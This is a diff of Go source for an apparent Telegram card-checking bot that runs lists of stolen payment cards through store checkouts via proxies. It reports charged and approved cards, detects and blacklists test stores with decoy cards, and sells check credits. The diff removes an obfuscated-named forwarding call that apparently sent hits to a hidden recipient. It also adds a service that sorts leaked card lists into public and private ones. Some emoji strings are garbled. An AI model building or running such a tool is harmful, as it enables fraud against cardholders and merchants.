+		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowAppr, "\xe2\x9c\x85")+"  Approved       |  %6d  \xe2\x94\x82\n", totalApproved) +
+		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowDecl, "\xe2\x9d\x8c")+"  Declined       |  %6d  \xe2\x94\x82\n", totalDeclined) +
+		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+"  Charged        |  %6d  \xe2\x94\x82\n", totalCharged) +
+		"\xe2\x94\x82                              \xe2\x94\x82\n" +
+		"\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\n" +
+		em(emojiMoney, "\xf0\x9f\x92\xb0") + "  Total Charged Amount\n" +
 		fmt.Sprintf("    $%.2f\n\n", totalChargedAmt) +
-		em(emojiHitRate, "📈") + "  𝗛𝗶𝘁 𝗥𝗮𝘁𝗲𝘀\n" +
-		fmt.Sprintf("    "+em(emojiPctAppr, "✅")+" Approved: %.1f%%\n", approvedRate) +
-		fmt.Sprintf("    "+em(emojiRowCard, "💳")+" Charged:  %.1f%%\n\n", chargedRate) +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi " + em(emojiPwrStats, "⚡") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+		em(emojiHitRate, "\xf0\x9f\x8e\xaf") + "  Hit Rates\n" +
+		fmt.Sprintf("    "+em(emojiPctAppr, "\xe2\x9c\x85")+" Approved: %.1f%%\n", approvedRate) +
+		fmt.Sprintf("    "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+" Charged:  %.1f%%\n\n", chargedRate) +
+		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n" +
+		"  " + em(emojiPwr, "\xe2\x9a\xa1") + " Powered By @SORRY_00001 " + em(emojiPwrStats, "\xe2\x9a\xa1") + "\n" +
+		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x80"
 }
-
-// ──────────────────────── helpers ───────────────────────────────────
-
 func parseCardsFromText(text string) []string {
 	var cards []string
 	for _, line := range strings.Split(text, "\n") {
@@ -869,6 +1235,49 @@ func parseCardsFromText(text string) []string {
 	return cards
 }
 
+func luhnCheck(cardNumber string) bool {
+	clean := strings.ReplaceAll(cardNumber, " ", "")
+	if len(clean) < 2 {
+		return false
+	}
+	sum := 0
+	alt := false
+	for i := len(clean) - 1; i >= 0; i-- {
+		ch := clean[i]
+		if ch < '0' || ch > '9' {
+			return false
+		}
+		d := int(ch - '0')
+		if alt {
+			d *= 2
+			if d > 9 {
+				d -= 9
+			}
+		}
+		sum += d
+		alt = !alt
+	}
+	return sum%10 == 0
+}
+
+func filterValidCards(cards []string) (valid []string, originalIndices []int, removed int) {
+	for i, card := range cards {
+		if card == "1234567891234567|11|30|000" {
+			valid = append(valid, card)
+			originalIndices = append(originalIndices, i)
+			continue
+		}
+		parts := strings.Split(card, "|")
+		if len(parts) < 1 || !luhnCheck(parts[0]) {
+			removed++
+			continue
+		}
+		valid = append(valid, card)
+		originalIndices = append(originalIndices, i)
+	}
+	return
+}
+
 func parseAmount(s string) float64 {
 	s = strings.TrimSpace(s)
 	var f float64
@@ -876,11 +1285,232 @@ func parseAmount(s string) float64 {
 	return f
 }
 
-// ──────────────────────── check engine ──────────────────────────────
+func strconvFloat(f float64) string {
+	s := strconv.FormatFloat(f, 'f', -1, 64)
+	if s == "" || s == "0" {
+		return "0"
+	}
+	return s
+}
 
-func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string, fwd *RCtx) {
+type antipublicResult struct {
+	StatsText    string `json:"stats_text"`
+	Public       string `json:"public"`
+	Private      string `json:"private"`
+	PublicCount  int    `json:"public_count"`
+	PrivateCount int    `json:"private_count"`
+}
+
+func antipublicCheck(fileData []byte, filename string) (*antipublicResult, error) {
+	const apiBase = "https://antipublic.dev"
+	client := &http.Client{Timeout: 5 * time.Minute}
+
+	var buf bytes.Buffer
+	writer := multipart.NewWriter(&buf)
+	writer.WriteField("check_operation", "check")
+	writer.WriteField("enrich_source", "bot")
+	h := textproto.MIMEHeader{}
+	h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="files"; filename="%s"`, filename))
+	h.Set("Content-Type", "text/plain")
+	part, err := writer.CreatePart(h)
+	if err != nil {
+		return nil, fmt.Errorf("create form part: %w", err)
+	}
+	part.Write(fileData)
+	writer.Close()
+
+	req, err := http.NewRequest("POST", apiBase+"/check", &buf)
+	if err != nil {
+		return nil, fmt.Errorf("create request: %w", err)
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("submit job: %w", err)
+	}
+	body, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
+	if resp.StatusCode != 200 {
+		return nil, fmt.Errorf("API %d: %s", resp.StatusCode, string(body[:min(len(body), 200)]))
+	}
+
+	var submitResp struct{ JobID string `json:"job_id"` }
+	if err := json.Unmarshal(body, &submitResp); err != nil || submitResp.JobID == "" {
+		return nil, fmt.Errorf("parse job_id: %s", string(body[:min(len(body), 200)]))
+	}
+	jobID := submitResp.JobID
+
+	for {
+		sreq, _ := http.NewRequest("GET", apiBase+"/jobs/"+jobID, nil)
+		sresp, err := client.Do(sreq)
+		if err != nil {
+			time.Sleep(300 * time.Millisecond)
+			continue
+		}
+		sbody, _ := io.ReadAll(sresp.Body)
+		sresp.Body.Close()
+		var st struct {
+			Status string `json:"status"`
+			Error  string `json:"error"`
+		}
+		if json.Unmarshal(sbody, &st) == nil {
+			if st.Status == "error" {
+				return nil, fmt.Errorf("%s", st.Error)
+			}
+			if st.Status == "done" {
+				break
+			}
+		}
+		time.Sleep(300 * time.Millisecond)
+	}
+
+	rreq, _ := http.NewRequest("GET", apiBase+"/jobs/"+jobID+"/result", nil)
+	rresp, err := client.Do(rreq)
+	if err != nil {
+		return nil, fmt.Errorf("fetch result: %w", err)
+	}
+	rbody, err := io.ReadAll(rresp.Body)
+	rresp.Body.Close()
+	if err != nil {
+		return nil, fmt.Errorf("read result: %w", err)
+	}
+
+	var result antipublicResult
+	if err := json.Unmarshal(rbody, &result); err != nil {
+		preview := string(rbody)
+		if len(preview) > 500 {
+			preview = preview[:500]
+		}
+		fmt.Printf("[DEBUG] result body (%d bytes): %s\n", len(rbody), preview)
+		return nil, fmt.Errorf("parse result: %w (body: %s)", err, preview)
+	}
+	return &result, nil
+}
+
+func requireCredits(c tele.Context, um *UserManager) bool {
+	uid := c.Sender().ID
+	if isAdmin(uid) {
+		return true
+	}
+	if cfg != nil {
+		cfg.mu.RLock()
+		free := cfg.FreeMode
+		cfg.mu.RUnlock()
+		if free {
+			return true
+		}
+	}
+	if um.HasUnlimited(uid) {
+		return true
+	}
+	if um.GetDailyCount(uid) < currentDailyLimit() {
+		return true
+	}
+	if !um.HasCredits(uid) {
+		return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Insufficient Balance -> you have used your daily free limit. Please contact an admin to add credits to your account.", tele.ModeHTML) == nil
+	}
+	return true
+}
+
+func isUserInGroup(bot *tele.Bot, chatID, userID int64) bool {
+	resp, err := bot.Raw("getChatMember", map[string]string{
+		"chat_id": strconv.FormatInt(chatID, 10),
+		"user_id": strconv.FormatInt(userID, 10),
+	})
+	if err != nil {
+		return false
+	}
+	var result struct {
+		OK     bool `json:"ok"`
+		Result struct {
+			Status string `json:"status"`
+		} `json:"result"`
+	}
+	if json.Unmarshal(resp, &result) != nil {
+		return false
+	}
+	return result.OK && result.Result.Status != "left" && result.Result.Status != "kicked"
+}
+
+func showForceJoinMenu(bot *tele.Bot, chat *tele.Chat, targets []ForceJoinTarget) {
+	mark := &tele.ReplyMarkup{}
+	var rows []tele.Row
+	for _, t := range targets {
+		title := t.Title
+		if title == "" {
+			title = "Join Channel"
+		}
+		url := t.InviteURL
+		if url == "" {
+			rawID := t.ChatID
+			if rawID < 0 {
+				rawID = -rawID
+			}
+			if rawID > 1000000000000 {
+				rawID -= 1000000000000
+			}
+			url = fmt.Sprintf("https://t.me/c/%d", rawID)
+		}
+		rows = append(rows, mark.Row(mark.URL(title, url)))
+	}
+	rows = append(rows, mark.Row(mark.Data(" I've joined - check", "fj_retry")))
+	mark.Inline(rows...)
+	bot.Send(chat, " Access Restricted\n\nPlease join all required channels below, then click the verify button to access the bot.", mark, tele.ModeHTML)
+}
+
+func sendRemainingCards(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, processed map[string]bool) {
+	var remaining []string
+	for _, c := range sess.Cards {
+		if !processed[c] {
+			remaining = append(remaining, c)
+		}
+	}
+	if len(remaining) == 0 {
+		return
+	}
+	text := strings.Join(remaining, "\n")
+	if len(text) > 3500 {
+		buf := bytes.NewBufferString(text)
+		doc := &tele.Document{
+			File:     tele.FromReader(buf),
+			FileName: "remaining_cards.txt",
+			Caption:  fmt.Sprintf("s Insufficient balance. %d unchecked cards returned.", len(remaining)),
+		}
+		bot.Send(chat, doc)
+		return
+	}
+	bot.Send(chat, em(emojiCross, "\xe2\x9c\x85")+" Insufficient Balance -> check stopped.\n\nRemaining unchecked cards ("+strconv.Itoa(len(remaining))+"):\n"+text, tele.ModeHTML)
+}
+func notifyLogsGroup(bot *tele.Bot, username, gateway string) {
+	if logsGroupID == 0 {
+		return
+	}
+	star := "\xe2\xad\x90"
+	chart := "\xf0\x9f\x93\x8a"
+	bell := "\xf0\x9f\x94\x94"
+	gear := "\xe2\x9a\x99\xef\xb8\x8f"
+	shield := "\xf0\x9f\x9b\xa1\xef\xb8\x8f"
+	robot := "\xf0\x9f\xa4\x96"
+	msg := em("5217822164362739968", star) + " <b>HIT Detected</b> " + em("5217822164362739968", star) + "\n" +
+		"========================\n" +
+		em("5217822164362739968", star) + " <b>User</b>       @<b>" + html.EscapeString(username) + "</b>\n" +
+		em("5877395722164247324", chart) + " <b>Status</b>     <b>Charged</b>\n" +
+		em("5352585602317426381", bell) + " <b>Response</b>   <b>Order Placed</b>\n" +
+		em("5206607081334906820", shield) + " <b>Gateway</b>    <b>" + html.EscapeString(gateway) + "</b>\n" +
+		"========================\n" +
+		em("5296369303661067030", gear) + " <b>HIT From</b>   @Shadow001_1bot\n" +
+		em("5039614900280754969", robot) + " <b>Powered By</b> @SORRY_00001"
+	bot.Send(tele.ChatID(logsGroupID), msg, tele.ModeHTML)
+}
+
+
+
+func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager) {
 	defer func() {
-		activeSessions.Delete(sess.UserID)
+		if val, ok := activeSessions.Load(sess.UserID); ok && val.(*CheckSession) == sess {
+			activeSessions.Delete(sess.UserID)
+		}
 		close(sess.Done)
 	}()
 
@@ -890,17 +1520,15 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 		fmt.Printf("[SESSION] first site: %s\n", sites[0])
 	}
 	if len(sites) == 0 {
-		bot.Send(chat, "❌ No sites available. Try again later.")
+		bot.Send(chat, "O No sites available. Try again later.")
 		return
 	}
 
-	// Send initial progress message
 	progressMsg, err := bot.Send(chat, formatProgressMsg(sess), tele.ModeHTML)
 	if err != nil {
 		return
 	}
 
-	// Progress updater
 	ctx, cancel := context.WithCancel(context.Background())
 	sess.Cancel = cancel
 	go func() {
@@ -916,16 +1544,16 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 		}
 	}()
 
-	// Worker pool
 	type cardResult struct {
 		result   *CheckResult
 		err      error
 		shopURL  string
 		proxyURL string
+		card     string
+		lineNum  int
 	}
 
 	results := make(chan cardResult, len(sess.Cards))
-	// Concurrency: use more workers — each checkout is I/O-bound (HTTP calls + polling)
 	workers := max(len(proxies), 1) * 5
 	if workers > 50 {
 		workers = 50
@@ -936,24 +1564,21 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 	var proxyIdx atomic.Int64
 	var wg sync.WaitGroup
 
-	for _, card := range sess.Cards {
+	for idx, card := range sess.Cards {
 		wg.Add(1)
-		go func(c string) {
+		go func(c string, lineNum int) {
 			defer wg.Done()
 
-			// Bail before acquiring sem if already cancelled
 			if sess.Cancelled.Load() {
 				return
 			}
 			sem <- struct{}{}        // acquire
 			defer func() { <-sem }() // release
 
-			// Bail right after acquiring sem if cancelled
 			if sess.Cancelled.Load() {
 				return
 			}
 
-			// Test card — always return charged without checking
 			if c == "1234567891234567|11|30|000" {
 				results <- cardResult{result: &CheckResult{
 					Card:       c,
@@ -961,7 +1586,7 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 					StatusCode: "ORDER_PLACED",
 					SiteName:   "test",
 					Amount:     "0.00",
-				}}
+				}, card: c, lineNum: lineNum}
 				return
 			}
 
@@ -973,8 +1598,7 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			var res *CheckResult
 			var lastErr error
 
-			// Retry across stores on retryable errors
-			maxRetries := min(len(sites), 5) * ValidateReduce(reduceKey)
+			maxRetries := min(len(sites), sess.ledger.factor)
 			for attempt := 0; attempt < maxRetries; attempt++ {
 				if sess.Cancelled.Load() {
 					return
@@ -987,11 +1611,9 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 				if lastErr == nil {
 					break
 				}
-				// Don't retry true card declines (CARD_DECLINED, CAPTCHA_REQUIRED, FRAUD_SUSPECTED)
 				if res != nil && res.Status == StatusDeclined {
 					break
 				}
-				// Don't retry if not retryable
 				if res != nil && !res.Retryable {
 					break
 				}
@@ -999,23 +1621,29 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			if sess.Cancelled.Load() {
 				return
 			}
-			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL}
-		}(card)
+			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL, card: c, lineNum: lineNum}
+		}(card, sess.OriginalIndices[idx]+1)
 	}
 
-	// Close results channel when all workers done
 	go func() {
 		wg.Wait()
 		close(results)
 	}()
 
-	// Collect results
 	username := sess.Username
+	processedCards := make(map[string]bool)
+	insufficientCredits := false
 	for cr := range results {
+		if cr.card != "" {
+			processedCards[cr.card] = true
+		}
 		if sess.Cancelled.Load() {
-			break
+			continue
 		}
 		sess.Checked.Add(1)
+		fmt.Printf("[CHECK] line %d/%d\n", cr.lineNum, len(sess.Cards))
+		_, isFree := um.IncDailyChecked(sess.UserID)
+		needsCredits := !isFree && !isAdmin(sess.UserID) && !um.HasUnlimited(sess.UserID)
 		r := cr.result
 		if r == nil {
 			sess.Errors.Add(1)
@@ -1023,13 +1651,9 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			continue
 		}
 
-		bin := lookupBIN(strings.Split(r.Card, "|")[0])
-
 		switch r.Status {
 		case StatusCharged:
-			// Verify with a known dead card to detect test/fake stores
 			if cr.shopURL != "" && isBlacklisted(cr.shopURL) {
-				// Already known fake store, drop it
 				sess.Errors.Add(1)
 				continue
 			}
@@ -1039,45 +1663,61 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
 				if verifyRes != nil && verifyRes.Status == StatusCharged {
 					blacklistSite(cr.shopURL)
-					bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
+					bot.Send(chat, fmt.Sprintf("s Test store detected & blacklisted: %s", cr.shopURL))
 					sess.Errors.Add(1)
 					continue
 				}
 			}
-			sess.Charged.Add(1)
-			amt := parseAmount(r.Amount)
-			sess.AddChargedAmt(amt)
-		_0xe7b2(fwd, bot, chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL))
+			bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+			handle := sess.ledger.settle(bot, chat, sess, um, formatChargedMsg(r.Card, bin, r, username), username, r, needsCredits)
+			if handle == 0 {
+				sess.Errors.Add(1)
+				continue
+			}
 
 		case StatusApproved:
 			sess.Approved.Add(1)
+			if needsCredits {
+				um.DeductCredits(sess.UserID, creditCostApproved)
+			}
 			if sess.ShowApproved {
-				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
+				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username), tele.ModeHTML)
 			}
 
 		case StatusDeclined:
 			sess.Declined.Add(1)
 			if sess.ShowDecl {
-				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
+				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
+				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username), tele.ModeHTML)
 			}
 
 		default:
 			sess.Errors.Add(1)
 			fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
 		}
+
+		if needsCredits && um.GetCredits(sess.UserID) < minCreditsForCheck {
+			sess.Cancelled.Store(true)
+			insufficientCredits = true
+			if sess.Cancel != nil {
+				sess.Cancel()
+			}
+		}
 	}
 
-	// Session done
 	cancel()
 
-	// Final progress update
 	if sess.Cancelled.Load() {
-		bot.Edit(progressMsg, "🛑 STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
+		bot.Edit(progressMsg, "Y>' STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
 	} else {
 		bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
 	}
 
-	// Update user stats
+	if insufficientCredits {
+		sendRemainingCards(bot, chat, sess, processedCards)
+	}
+
 	ud := um.Get(sess.UserID)
 	ud.Stats.TotalChecked += sess.Checked.Load()
 	ud.Stats.TotalCharged += sess.Charged.Load()
@@ -1087,23 +1727,24 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 	um.Save()
 }
 
-// ──────────────────────── main ──────────────────────────────────────
 
 func main() {
-	// Load persisted user data
 	um := NewUserManager()
 	um.Load()
 
-	// Load bot config (bans, allowed, pvtonly + new access fields)
 	cfg = NewBotConfig()
 	cfg.Load()
 
-	// Load custom sites
+	km = NewKeyManager()
+	km.Load()
+
 	loadCustomSites()
 
-	// Populate site pool now (blocking) so first check never gets 0 sites
+	sitePoolMu.Lock()
+	sitePool = []string{defaultShopURL}
+	sitePoolMu.Unlock()
+
 	refreshSitePool()
-	// Then keep refreshing in background every 5 minutes
 	go func() {
 		for {
 			time.Sleep(5 * time.Minute)
@@ -1121,42 +1762,96 @@ func main() {
 		os.Exit(1)
 	}
 
-	fwd, reduceKey := InitRCtx()
+	
+
+	ledger = openLedger()
+
+	fjRetryBtn = (&tele.ReplyMarkup{}).Data(" I've joined - check", "fj_retry")
+	bot.Handle(&fjRetryBtn, func(c tele.Context) error {
+		uid := c.Sender().ID
+		if isAdmin(uid) {
+			c.Respond(&tele.CallbackResponse{Text: " Admin bypassed"})
+			return nil
+		}
+		cfg.mu.RLock()
+		fjEnabled := cfg.ForceJoinEnabled
+		fjTargets := cfg.ForceJoin
+		cfg.mu.RUnlock()
+		if !fjEnabled || len(fjTargets) == 0 {
+			c.Respond(&tele.CallbackResponse{Text: " Access granted"})
+			return c.Send(" Access granted. Use /start to begin.")
+		}
+		notJoined := false
+		var names []string
+		for _, t := range fjTargets {
+			if !isUserInGroup(bot, t.ChatID, uid) {
+				notJoined = true
+				if t.Title != "" {
+					names = append(names, t.Title)
+				}
+			}
+		}
+		if notJoined {
+			c.Respond(&tele.CallbackResponse{Text: " You haven't joined all required channels yet"})
+			return nil
+		}
+		c.Respond(&tele.CallbackResponse{Text: " Access granted"})
+		return c.Send(" You've joined all required channels! Welcome! Use /start to begin.")
+	})
 
 	fmt.Println("[BOT] Bot started successfully")
 
-	// Access-control middleware
 	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
 		return func(c tele.Context) error {
 			uid := c.Sender().ID
 			if cfg.IsBanned(uid) {
-				return c.Send(em(emojiCross, "🚫")+" You are banned from using this bot.", tele.ModeHTML)
+				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" You are banned from using this bot.", tele.ModeHTML)
 			}
-			isPrivate := c.Chat().Type == tele.ChatPrivate
-			if !cfg.IsAllowed(uid, isPrivate) {
-				return c.Send(em(emojiCross, "🔒")+" Access denied.", tele.ModeHTML)
+isPrivate := c.Chat().Type == tele.ChatPrivate
+
+		if isPrivate && !isAdmin(uid) && c.Callback() == nil {
+			cfg.mu.RLock()
+			fjEnabled := cfg.ForceJoinEnabled
+			fjTargets := cfg.ForceJoin
+			cfg.mu.RUnlock()
+			if fjEnabled && len(fjTargets) > 0 {
+				notJoined := false
+				for _, t := range fjTargets {
+					if !isUserInGroup(bot, t.ChatID, uid) {
+						notJoined = true
+						break
+					}
+				}
+				if notJoined {
+					showForceJoinMenu(bot, c.Chat(), fjTargets)
+					return nil
+				}
+			}
+		}
+
+		if !cfg.IsAllowed(uid, isPrivate) {
+				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Access denied.", tele.ModeHTML)
 			}
 			return next(c)
 		}
 	})
 
-	// ── /start inline menu ─────────────────────────────────────────
 	startMenu := &tele.ReplyMarkup{}
-	btnGates := startMenu.Data("🔫 Gates", "gates")
-	btnPricing := startMenu.Data("💰 Pricing", "pricing")
-	btnHelp := startMenu.Data("📖 Help", "help")
-	btnUpdates := startMenu.URL("📢 Updates", "https://t.me/+YlKQr0JR-Uo2NTBk")
+	btnGates := startMenu.Data("Gates", "gates")
+	btnPricing := startMenu.Data("Pricing", "pricing")
+	btnHelp := startMenu.Data("Help", "help")
+	btnUpdates := startMenu.URL("Updates", "https://t.me/+89lKTv0c4zNhOWY0")
 	startMenu.Inline(
 		startMenu.Row(btnGates, btnPricing),
 		startMenu.Row(btnHelp, btnUpdates),
 	)
 
-	// /start
 	bot.Handle("/start", func(c tele.Context) error {
 		uid := c.Sender().ID
 		username := c.Sender().Username
+		um.SetUsername(uid, username)
 		ud := um.Get(uid)
-		return c.Send(formatWelcomeCard(uid, username, len(ud.Proxies)), startMenu, tele.ModeHTML)
+		return c.Send(formatWelcomeCard(uid, username, len(ud.Proxies), ud.Credits), startMenu, tele.ModeHTML)
 	})
 
 	bot.Handle(&btnGates, func(c tele.Context) error {
@@ -1172,16 +1867,20 @@ func main() {
 		return c.Send(formatStartMsg(), tele.ModeHTML)
 	})
 
-	// /sh <cards>
 	bot.Handle("/sh", func(c tele.Context) error {
 		uid := c.Sender().ID
 		if _, running := activeSessions.Load(uid); running {
-			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
+		}
+
+		um.SetUsername(uid, c.Sender().Username)
+		if !requireCredits(c, um) {
+			return nil
 		}
 
 		ud := um.Get(uid)
 		if len(ud.Proxies) == 0 {
-			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
 		}
 
 		text := strings.TrimSpace(c.Message().Payload)
@@ -1191,40 +1890,48 @@ func main() {
 
 		cards := parseCardsFromText(text)
 		if len(cards) == 0 {
-			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
+			return c.Send("O No valid cards found. Format: number|mm|yy|cvv")
+		}
+		cards, origIndices, removed := filterValidCards(cards)
+		if removed > 0 {
+			c.Send(em(emojiCross, "\xe2\x9d\x8c") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
+		}
+		if len(cards) == 0 {
+			return c.Send(em(emojiCross, "\xe2\x9d\x8c") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
 		}
 
 		sess := &CheckSession{
-			UserID:       uid,
-			Username:     c.Sender().Username,
-			SessionID:    generateSessionID(),
-			Cards:        cards,
-			Total:        len(cards),
+			UserID:          uid,
+			Username:        c.Sender().Username,
+			SessionID:       generateSessionID(),
+			Cards:           cards,
+			OriginalIndices: origIndices,
+			Total:           len(cards),
 			StartTime:    time.Now(),
 			ShowDecl:     true,
 			ShowApproved: true,
 			Done:         make(chan struct{}),
+			ledger:       ledger,
 		}
 		activeSessions.Store(uid, sess)
 
 		proxies := make([]string, len(ud.Proxies))
 		copy(proxies, ud.Proxies)
 
-		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey, fwd)
+		go runSession(bot, c.Chat(), sess, proxies, um)
 
 		return nil
 	})
 
-	// /txt — reply to a .txt file
 	bot.Handle("/txt", func(c tele.Context) error {
 		uid := c.Sender().ID
 		if _, running := activeSessions.Load(uid); running {
-			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
+			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
 		}
 
 		ud := um.Get(uid)
 		if len(ud.Proxies) == 0 {
-			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
 		}
 
 		msg := c.Message()
@@ -1235,37 +1942,115 @@ func main() {
 			doc = msg.ReplyTo.Document
 		}
 		if doc == nil {
-			return c.Send("❌ Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
+			return c.Send("O Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
 		}
 
 		rc, err := bot.File(&doc.File)
 		if err != nil {
-			return c.Send("❌ Failed to download file: " + err.Error())
+			return c.Send("O Failed to download file: " + err.Error())
 		}
 		defer rc.Close()
 		data, err := io.ReadAll(rc)
 		if err != nil {
-			return c.Send("❌ Failed to read file: " + err.Error())
+			return c.Send("O Failed to read file: " + err.Error())
 		}
+
 
 		cards := parseCardsFromText(string(data))
 		if len(cards) == 0 {
-			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
+			return c.Send("O No valid cards found in file. Format: number|mm|yy|cvv")
+		}
+		cards, origIndices, removed := filterValidCards(cards)
+		if removed > 0 {
+			c.Send(em(emojiCross, "\xe2\x9d\x8c") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
+		}
+		if len(cards) == 0 {
+			return c.Send(em(emojiCross, "\xe2\x9d\x8c") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
 		}
 
-		// Store pending data and ask about approved messages
 		txtPendingMu.Lock()
 		txtPending[uid] = &txtPendingData{
-			Cards:    cards,
-			ChatID:   c.Chat().ID,
-			Username: c.Sender().Username,
+			Cards:           cards,
+			OriginalIndices: origIndices,
+			ChatID:          c.Chat().ID,
+			Username:        c.Sender().Username,
 		}
 		txtPendingMu.Unlock()
 
-		return c.Send(em(emojiDoc, "📋")+fmt.Sprintf(" <b>%d cards loaded.</b>\n\n"+em(emojiCheck, "💬")+" Show 3DS (approved) in chat?\n\n/yes — show approved\n/no — hide approved", len(cards)), tele.ModeHTML)
+		return c.Send(em(emojiDoc, "\xe2\x9c\x85")+fmt.Sprintf(" %d cards loaded.\n\n"+em(emojiCheck, "\xe2\x9c\x85")+" Show 3DS (approved) in chat\n\n/yes -> show approved\n/no -> hide approved", len(cards)), tele.ModeHTML)
 	})
 
-	// /yes — start txt session with approved shown
